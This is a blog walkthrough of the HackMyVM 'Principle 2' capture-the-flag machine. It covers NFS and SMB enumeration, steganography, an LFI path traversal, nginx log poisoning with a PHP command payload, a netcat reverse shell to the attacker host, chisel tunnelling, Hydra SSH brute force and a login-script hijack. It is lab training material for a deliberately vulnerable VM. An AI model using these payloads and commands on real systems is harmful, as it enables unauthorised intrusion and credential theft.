---
title: Hack My VM Principle 2 walkthrough
date: 2023-12-18 00:00:01 +0000
categories: [hackmyvm, vm]
tags: [hackmyvm, walkthrough, hmv, principle, rpc, nfs, user impersonation, steganography, path traversal, lfi, log poisoning, reverse proxy, chisel, hydra, binary hijack]
img_path: /assets/img/posts/
---

![Principle 2](hmv-principle2-logo.png)
*HMV Principle 2*

I was back to acting last beta tester for my friend [Kaian][1].
I have dedicated the last few days to solve [Kaian][1]'s last machine: [Principle 2][2] for HackMyVM.
I really, admire **A LOT** all the work behind each of one of these boxes.
Again, it was a very fun machine and it was a great experience help him, but, this time I have to admit that was a little more complicated.
This time it was a medium level machine, and to solve [Principle 2][2], I had to learn a few new tricks.

And, as always, once completed the box, it's time to write my walkthough.

## Annotations

>In this article we are going to asume the following ip addresses:
>
>Local machine (attacker, local host): 10.0.0.1
>
>Target machine (victim, [Principle 2][2] box): 10.0.0.2
{: .prompt-info}

## Warnings

>Take a snapshot of the machine just after a fresh install.
>You may need it later.
{: .prompt-warning}

## Enumeration

Let's see what services are running:

```
nmap -Pn -n -p- -T5 --min-rate 5000 10.0.0.2
```

```
Nmap scan report for 10.0.0.2
Host is up (0.00016s latency).
Not shown: 63482 closed tcp ports (reset), 2043 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
33591/tcp open  unknown
36599/tcp open  unknown
37023/tcp open  unknown
47791/tcp open  unknown
49353/tcp open  unknown
```

We can see trhee interesting services: web service, rpc and nfs.

### Web service

If we browse to the machine, we will find the default apache webpage:

![Default apache web page](hmv-principle2-default-apache-web-page.png)
*Default apache web page*

### RPC/NFS

If you find nfs then, probably, you can list and download (maybe upload) files.
Let's take a look:

```
$ showmount -e 10.0.0.2
```

```
Export list for 10.0.0.2:
/var/backups *
/home/byron  *
```

Let's mount them and see what we find:

```
$ sudo mount -t nfs 10.0.0.2:/var/backups /tmp/backups -o nolock
$ sudo mount -t nfs 10.0.0.2:/home/byron /tmp/byron -o nolock
```

#### /home/byron

```
$ ls -la /tmp/byron
...
lrwxrwxrwx 1 root root      9 Nov 25 12:33 .bash_history -> /dev/null
-rw-r--r-- 1 1001   1001  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 1001   1001 3526 Apr 23  2023 .bashrc
drwxr-xr-x 3 1001   1001 4096 Nov 23 07:13 .local
-rw-r--r-- 1 1001   1001  114 Nov 19 18:55 mayor.txt
-rw-r--r-- 1 1001   1001  219 Nov 23 07:22 memory.txt
-rw-r--r-- 1 1001   1001  807 Apr 23  2023 .profile
```

After examining the files, the only interesting files that we found are `mayor.txt` and `memory.txt`.

```
$ cat /tmp/byron/mayor.txt
Now that I am mayor, I think Hermanubis is conspiring against me, I guess he has a secret group and is hiding it.
```

`mayor.txt` tells us a little about the relation between Byron and Hermanubis:

```
$ cat /tmp/byron/memory.txt
Hermanubis told me that he lost his password and couldn't change it, thank goodness I keep a record of each neighbor with their number and password in hexadecimal. I think he would be a good mayor of the New Jerusalem.
```

`memory.txt` tells us about Hermanubis lost his password, and the most interesting, Byron keeps a record (a backup, maybe?) of each neighbor password encoded in hexadecimal.

#### /var/backups

Let's take a look to `/backups`:

```
$ ls -la /tmp | grep backups
drwxr--r-- 2 54 backup 28672 Nov 28 19:00 backups
```

We can't read the files inside `/backups` because the lack of permissions.
But, we can see that the owner of `/backups` is the user with UID 54, so we can impersonate that user by creating a new one with this UID:

```
$ sudo useradd -u 54 principle2 -g backup
$ sudo mkdir /tmp/bkp
$ sudo chown principle2 -R /tmp/bkp
$ sudo chmod 755 -R /tmp/bkp
```

With our new user we can read the files inside `/backups`:

```
$ sudo su principle2
$ ls /tmp/backups
```

And we see that there are a lot of text files naming with numbers.
Filenames seems like a code, doesn't?

### SMB

Now, let's take a look at smb:

```
$ enum4linux -a 10.0.0.2
...
        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      New Jerusalem Public
        hermanubis      Disk      Hermanubis share
        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
...
//10.0.0.2/public   Mapping: OK Listing: OK Writing: N/A
//10.0.0.2/hermanubis       Mapping: DENIED Listing: N/A Writing: N/A
```

We can see that we can read in `/public`, and we found the user `hermanubis` and we can't read (or write) in `/hermanubis`.
Let's mount them and take a look:

#### /public

```
$ sudo mount -t cifs //10.0.0.2/public /tmp/public
$ ls -la /tmp/public
...
-rwxr-xr-x 1 root root    931 Nov 19 07:01 loyalty.txt
-rwxr-xr-x 1 root root    158 Nov 19 07:01 new_era.txt
-rwxr-xr-x 1 root root    718 Nov 19 07:00 straton.txt
```

We keep finding details of the history between Byron and Hermanubis:

```
$ cat /tmp/backups/loyalty.txt
This text was the source of considerable controversy in a debate between Byron (7) and Hermanubis (452).

What I propose, then, is that we are not born as entirely free agents, responsible only for ourselves. The very core of what we are, our sentience, separates us from and elevates us above the animal kingdom. As I have argued, this is not a matter of arrogance, but of responsibility.

2257686f2061726520796f752c207468656e3f22

To put it simply: each of us owes a burden of loyalty to humanity itself, to the human project across time and space. This is not a minor matter, or some abstract issue for philosophers. It is a profound and significant part of every human life. It is a universal source of meaning and insight that can bind us together and set us on a path for a brighter future; and it is also a division, a line that must held against those who preach the gospel of self-annihilation. We ignore it at our peril.
```

`2257686f2061726520796f752c207468656e3f22`?

```
$ echo "2257686f2061726520796f752c207468656e3f22" | xxd -p -r
"Who are you, then?"%
```

The hexadecimal string doesn't seem very interesting. What does seem interesting is the `Byron (7) and Hermanubis (452)` part.
Could this numbers be the "neighbor IDs"?

```
$ cat /tmp/backups/452.txt
4279726f6e4973417373686f6c650a0a
```

```
$ echo -n 4279726f6e4973417373686f6c650a0a | xxd -p -r
ByronIsAsshole
```

It looks like a possible password...
And we found a couple more pieces about New Jerusalem history:

```
$ cat new_era.txt
Yesterday there was a big change, new government, new mayor. All citizens were reassigned their tasks. For security, every user should change their password.
```

```
$ cat straton.txt
This fragment from Straton's On the Universe appears to have been of great significance both to the Progenitor and to the Founder.

AMYNTAS:        But what does this tell us about the nature of the universe, which is what we were discussing?
STRATON:        That is the next question we must undertake to answer. We begin with the self because that is what determines our existence as individuals; but the self cannot exist without that which surrounds it. The citizen lives within the city; and the city lives within the cosmos. So now we must apply the principle we have discovered to the wider world, and ask: if man is like a machine, could it be that the universe is similar in nature? And if so, what follows from that fact?
```

#### /hermanubis

Let's mount `/hermanubis` now:

```
sudo mount -t cifs //10.0.0.2/hermanubis /tmp/hermanubis -o username=hermanubis
```

Asks for a password, let's try `ByronIsAsshole`...

```
$ ls
...
  index.html                          N      346  Tue Nov 28 09:44:41 2023
  prometheus.jpg                      N   307344  Tue Nov 28 12:23:24 2023
```

```
$ cat index.html
...
    <h1>Welcome to the resistance forum</h1>
    <p>free our chains!</p>
    <img src="prometheus.jpg" alt="chained">
```

The only information we get with `index.html` is that Hermanubis is in the resistance.
Let's apply steganographic analysis to `prometheus.jpg`:

```
$ stegseek prometheus.jpg /usr/share/wordlists/rockyou.txt
...
[i] Found passphrase: "soldierofanubis"
[i] Original filename: "secret.txt".
[i] Extracting to "prometheus_message.txt".
```

```
$ cat prometheus_message.txt
I have set up a website to dismantle all the lies they tell us about the city: thetruthoftalos.hmv
```

## thetruthoftalos.hmv

Ok, now that we have a new domain, we append it to our `/etc/hosts`:

```
$ echo "10.0.0.2 thetruthoftalos.hmv" | sudo tee -a /etc/hosts
10.0.0.2 thetruthoftalos.hmv
```

If we browse to `thetruthoftalos.hmv` we will found nothing (literally):

![thetruthoftalos.hmv index.html](hmv-principle2-thetruthoftalos-hmv-index-html.png)
*thetruthoftalos.hmv index.html*

### Directory enumeration

We will search for resources on our new host:

```
$ gobuster dir -u http://thetruthoftalos.hmv --wordlist /usr/share/wordlists/dirb/common.txt -b 403,404 -x php,html,txt
...
/index.html           (Status: 200) [Size: 8]
/index.php            (Status: 200) [Size: 1970]
/index.php            (Status: 200) [Size: 1970]
/index.html           (Status: 200) [Size: 8]
/uploads              (Status: 301) [Size: 169] [--> http://thetruthoftalos.hmv/uploads/]
```

### index.php

![thetruthoftalos.hmv index.php](hmv-principle2-thetruthoftalos-hmv-index-php.png)
*thetruthoftalos.hmv index.php*

We can type the name of a god and we will see info about it.

>Talks about twelve gods, but, there are fourteen ;)
{: .prompt-info}

### Path traversal/LFI (Local File Inclusion)

We can't access to `/uploads`, but we can load the file of a god by requesting it in the url.
If we look at the url that is showed when we insert the name of a god, we will see that maybe vulnerable to path traversal and/or a LFI.
After messing around a while with `wfuzz` we can found an LFI vulnerability.

```
http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
```

![/etc/passwd](hmv-principle2-etc-passwd.png)
*/etc/passwd*

We can see the system users in the `/etc/passwd` file.

As is a `nginx` server, we will try to find the `access.log` and `error.log` files:

```
http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/nginx/access.log
http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/nginx/error.log
```

### Log poisoning

As the `access.log` and `error.log` files are publicly accessible, we will try a log poisoning:

>This is the most tricky point.
>If you do not get the log poisoning on the first attempt because it's sent or write in a wrong format, php will be interpreted loading the logs, but will throw errors, so the poisoning (and future poisonings) won't work.
>At this point, if you fail poisoning the log, and, if you took a snapshot of the fresh install, you can restore the Virtual Machine to its original state very fast.
>If you didn't take the snapshot, you will have to reinstall the Virtual Machine, and takes more time.
{: .prompt-info}

We start a listener on our host:

```
$ nc -lvnp 12345
```

Now, we poison the log and we try to get a reverse shell:

```
$ curl -i -v http://thetruthoftalos.hmv/index.php -A "<?php system(\$_REQUEST['cmd']);?>"
$ curl -i -v "http://thetruthoftalos.hmv/index.php?filename=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F%2Fvar%2Flog%2Fnginx%2Faccess.log&cmd=nc%20-e%20/bin/sh%2010.0.1%2012345"
```

>I did my php payload from zsh, so I had to escape the "$":
{: .prompt-warning}


If the log poisoning worked, we will have shell as `www-data`, and we will have to treat our tty to be able to work comfortably:

First, we get our terminal size, in the host:

```
$ stty size
56 205
```

Now, we treat our new tty in [Principle 2][2]:

```
$ script /dev/null -c bash
CTRL+Z
$ stty raw -echo; fg
$ reset xterm
$ export TERM=xterm
$ export SHELL=bash
$ stty rows 56 columns 256
```

### User flag

We have Hermanubis' password for SMB, so let's see if he has the same password for his user:

```
$ su hermanubis
Password: ByronIsAsshole
```

Ok, it worked:

```
$ id
uid=1002(hermanubis) gid=1002(hermanubis) groups=1002(hermanubis

$ ls -la /home/hermanubis
...
lrwxrwxrwx 1 root       root          9 Nov 25 17:34 .bash_history -> /dev/null
-rwx------ 1 hermanubis hermanubis  220 Apr 23  2023 .bash_logout
-rwx------ 1 hermanubis hermanubis 3526 Apr 23  2023 .bashrc
-rwx------ 1 hermanubis hermanubis  264 Nov 23 21:18 investigation.txt
-rwx------ 1 hermanubis hermanubis  807 Apr 23  2023 .profile
drwxr-x--- 2 hermanubis hermanubis 4096 Nov 28 14:44 share
-rwx------ 1 hermanubis hermanubis 1080 Nov 25 17:29 user.txt
```

Now, we can get our first flag:

```
$ cat /home/hermanubis/user.txt
```

What was Hermanubis investigating?

```
$ cat /home/hermanubis/investigation.txt
I am aware that Byron hates me... especially since I lost my password.
My friends along with myself after several analyses and attacks, we have detected that Melville is using a 32 character password....
What he doesn't know is that it is in the Byron database...
```

Ok, so we know that Melville has a 32 character password.
All txt files in `/var/backup` have 32 characters, so let's assume that Melville is using an hexadecimal password that is stored in Byron's backup.
And we need a way to exploit this.

### SSH

If we chek the running services, we will find a running ssh service on port 345:

```
$ systemctl status ssh.service
● ssh.service - OpenBSD Secure Shell server
 ...
     Active: active (running) since ...
```

```
$ ss -tunel
Netid        State         Recv-Q        Send-Q               Local Address:Port                Peer Address:Port        Process
...
tcp          LISTEN        0             128                           [::]:345                         [::]:*            ino:16724 sk:29 cgroup:/system.slice/ssh.service v6only:1 <->
...
```

We can stablish a reverse proxy using chisel and try to brute force the ssh authentication with hydra.

#### The dictionary

The first thing we are going to need to perform this attack it's to create a dictionary with all the neighbors passwords:

```
$ sudo su principle2
$ cat /tmp/backups/*.txt > /tmp/neighbors_passwords.txt
$ exit
```

#### Chisel

We check which version of chisel we need:

```
$ uname -a
Linux principle2 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64 GNU/Linux
```

We need the amd64 version of chisel, and copy the binary from our host to [Principle 2][2].
To do this, we will mount an http server in our host, in the directory where we have the chisel binaries, with python:

```
$ python -m http.server 443
```

And, in [Principle 2][2], we download the chisel bynary from our host:

```
$ wget http://10.0.0.1:443/chisel_1.9.1_linux_amd64
$ mv chisel_1.9.1_linux_amd64 chisel
$ chmod 700 chisel
```

Once copied, we will start the chisel server on our host:

```
$ ./chisel_1.9.1_linux_amd64 server --reverse 8080
```

And now, we will start the chisel client on [Principle 2][2]:

```
$ ./chisel client 10.0.0.1:8080 R:22222:127.0.0.1:345
```

#### Hydra

Once stablished the reverse proxy we will bruteforce the password from our host using hydra:

```
$ hydra -l melville -P /tmp/neighbors_password.txt -s 22222 127.0.0.1 ssh -f -o /tmp/melvile_pasword.txt
```

```
$ cat /tmp/melville_password.txt
... password: 1bd5528b6def9812acba8eb21562c3ec
```

## Melville

We connect as Melville using ssh:

```
$ ssh -p 22222 melville@localhost

root is watching you, it has a record of all your steps:
```

Let's see what we can do:

```
$ id
uid=1003(melville) gid=1003(melville) groups=1003(melville),1000(talos)
```

Melville is part of the `talos` group, interesting.

```
$ cat note.txt
Don't touch SUID, it is very DANGEROUS
```

We heed the warning, and, examining the files, we find the login warning message:

```
$ cat .bashrc | more
echo -e "root is watching you, it has a record of all your steps:\n`cat /opt/users.txt`"
```

We search interesting files that belongs to our user or groups:

```
$ find / -user melville -o -group melville -o -group talos 2>/dev/null | grep -vE '/run/user|/proc|/sys/fs|/dev|/home'
/opt/users.txt
/usr/bin/updater
/usr/local/share/report
```

```
$ ls -la /opt/users.txt
-rw-r----- 1 root talos 95 Dec 11 20:47 /opt/users.txt

$ ls -la /usr/bin/updater
-rwsr-x--- 1 root melville 16232 Nov 26 11:38 /usr/bin/updater

$ ls -la /usr/local/share/report
-rwxrwx--- 1 root talos 59 Dec  8 21:07 /usr/local/share/report
```

`/opt/users.txt` contains a list of the active users and the login time:

```
$ cat /opt/users.txt
melville pts/0        2023-12-18 00:00 (10.0.0.1)
```

And, after investigating the other binaries, we find that `/usr/bin/updater` it's only a script which upgrades the system, while `/usr/local/share/report` is the script used to write the logins (the output of the `who` command) in `/opt/users.txt`.
As the time stored in `/opt/users.txt` it's our login time, we an assume that `/usr/local/share/report` it's executed on login.
And, if we look closely, we can see that we have write permissions because we are in the `talos` group.
So we can try to hijack this file in order to get the root flag.

### Hijacking

We will override the `/usr/local/share/report` content with a simple bash script that retrieves the root flag:

```
#!/usr/bin/env bash

cat /root/root.txt > /home/melville/root_flag.txt
```

Now, we logout, we login again as `melville` and we will get the root flag waiting for us in our `home`!

_Enjoy! ;)_

[1]: https://kaianperez.github.io
[2]: https://hackmyvm.eu/machines/machine.php?vm=Principle2
